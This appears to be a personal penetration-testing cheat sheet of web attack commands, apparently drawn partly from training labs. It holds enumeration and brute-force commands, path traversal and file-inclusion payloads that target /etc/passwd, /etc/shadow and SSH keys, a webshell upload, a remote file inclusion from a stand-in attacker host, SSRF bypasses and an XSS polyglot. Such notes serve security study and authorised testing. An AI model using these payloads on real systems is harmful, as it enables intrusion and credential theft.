# Web technology related commands

---

## Directory & File Enumeration

### Gobuster

- Directories:
  ```bash
  gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -o gb_directories
  ```
- Files:
  ```bash
  gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -o gb_files
  ```
- All (multiple useful wordlists/extensions):
  ```bash
  gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gb_all
  gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gb_all -x php,asp,txt,md,html
  gobuster dir -u $URL -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o gb_all
  ```
- Vhosts:
  ```bash
  gobuster vhost -u $URL -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
  ```

### FFuF

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u $URL/FUZZ
```

### Feroxbuster

```bash
feroxbuster --url $URL
feroxbuster --url $URL -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
```

### Alternative Wordlists

| Count  | Path                                                                     |
| -------- | -------------------------------------------------------------------------- |
| 137771 | `/usr/share/seclists/Discovery/Web-Content/combined_directories.txt`     |
| 127383 | `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt`   |
| 22056  | `/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`           |
| 20469  | `/usr/share/dirb/wordlists/big.txt`                                      |
| 14170  | `/usr/share/dirbuster/wordlists/directory-list-1.0.txt`                  |
| 12833  | `/usr/share/seclists/Discovery/Web-Content/combined_words.txt`           |
| 11960  | `/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt`         |
| 8766   | `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt` |
| 8701   | `/usr/share/seclists/Discovery/Web-Content/LinuxFileList.txt`            |
| 2565   | `/usr/share/seclists/Discovery/Web-Content/quickhits.txt`                |

### Extensions

| no | File Type    | Uses                                        |
| ---- | -------------- | --------------------------------------------- |
| 1  | `.yaml,.yml` | Config files especially on flat cms systems |

### API Enumeration

| Count | Path                                                                  |
| ------- | ----------------------------------------------------------------------- |
| 268   | `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt`     |
| 3132  | `/usr/share/seclists/Discovery/Web-Content/api/objects.txt`           |
| 12334 | `/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt` |

---

## Vulnerability Scanning

### Nuclei

```bash
nuclei -u $URL -o nuclei-scan
```

---

## WordPress Enumeration

### WPScan

- Basic Scan:
  ```bash
  wpscan --url $URL
  ```
- Plugins, Users, Themes:
  ```bash
  wpscan --url $URL -e vt,vp,u --api-token $WP_SCAN_API
  ```
- Brute Force Users:
  ```bash
  wpscan --url $URL -P /usr/share/wordlist/rockyou.txt
  ```

---

## IIS/WebDAV Exploits

```bash
nmap -T5 -p80 --script=http-iis-webdav-vuln $IP
nmap --script http-webdav-scan -p80 $IP
```

---

## Curl Tricks

- Path Traversal:
  ```bash
  curl --path-as-is $URL:3000/public/plugins/welcome/../../../../../../../../etc/passwd
  ```
  * `--path-as-is` preserves traversal attempts

- File Upload:
  ```bash
  curl -F "name=test" -F "class_id=1" -F "subject_id=1" -F "timestamp=2021-12-08" \
  -F "teacher_id=1" -F "file_type=txt" -F "status=1" -F "description=123123" \
  -F "_wysihtml5_mode=1" -F filename=@cmd.php
  ```

---

## Favicon Fingerprinting

- [OWASP Favicon DB](https://wiki.owasp.org/index.php/OWASP_favicon_database)
- Get hash:
  ```bash
  curl http://target/favicon.ico | md5sum
  TARGET=$URL/favicon.ico
  HASH=$(curl $TARGET | md5sum | cut -d ' ' -f 1)
  curl -s https://wiki.owasp.org/index.php/OWASP_favicon_database | grep $HASH
  ```

---

## Sitemap.xml Discovery

```bash
curl $URL/sitemap.xml 
curl $URL/sitemap.xml | grep loc
```

---

## Header Review

```bash
curl -v -I http://target
```

---

## Subdomain & VHost Enumeration

- Certificate
  Transparency: [crt.sh](http://crt.sh/) | [entrust.com](https://ui.ctsearch.entrust.com/ui/ctsearchui)
- dnsrecon:
  ```bash
  dnsrecon -t brt -d target.com
  dnsrecon -t brt -d $URL
  ```
- Sublist3r:
  ```bash
  sublist3r -d target.com
  sublist3r -d $URL
  ```
- amass:
  ```bash
  amass intel -whois -d example.com
  amass enum -d example.com
  ```
- Gobuster vhost:
  ```bash
  gobuster vhost -u $URL -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
  ```
- FFuF vhost:
  ```bash
  ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.acmeitsupport.thm" -u http://10.10.196.56
  ```

---

## Authentication Bypass & Username Enumeration

- FFuF for username existence:
  ```bash
  ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.245.78/customers/signup -mr "username already exists"
  ```

---

## IDOR (Insecure Direct Object Reference)

- Access resources not belonging to you.

---

## File Inclusion

### Path Traversal

- Common vulnerable PHP function:
  ```php
  get_file_contentes
  ```
- Common files:
  * `/etc/issue`, `/etc/profile`, `/proc/version`, `/etc/passwd`,
    `/etc/shadow`, `/root/.bash_history`, `/var/log/dmessage`,
    `/var/mail/root`, `/root/.ssh/id_rsa`, `/var/log/apache2/access.log`,
    `c:\boot.ini`

### Local File Inclusion

- Vulnerable PHP functions:
  ```php
  include
  require
  include_once
  require_once
  ```
- Null byte bypass (pre PHP 5.3.4):
  ```php
  /lab3.php?file=../../../../etc/passwd%00")
  ```

### Remote File Inclusion

  ```php
  /lab3.php?file=http://attacker/file
  ```

---

## SSRF (Server-side Request Forgery)

- External request
  capture: [requestbin.com](http://requestbin.com) | [webhook.site](https://webhook.site)
- Path manipulation:
  * `../../` to change API path
  * `&x=` to nullify rest of line
- Localhost bypasses:
  ```bash
  http://0
  http://0.0.0.0
  http://0000
  http://127.1
  http://127.*.*.*
  http://2130706433
  http://017700000001
  http://127.0.0.1.nip.ip
  ```
- Cloud metadata:
  * `169.254.169.254`
- DNS-based bypass:
  * `http://website.com.whirley.com`

---

## Open Redirect

- Tracking endpoints that redirect to next page.

---

## XSS (Cross-site Scripting)

- Polyglot payloads:
  ```javascript
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror = alert('THM'))//%0D%0A%0d%0a//
  < /stYle/
  </titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
  ```
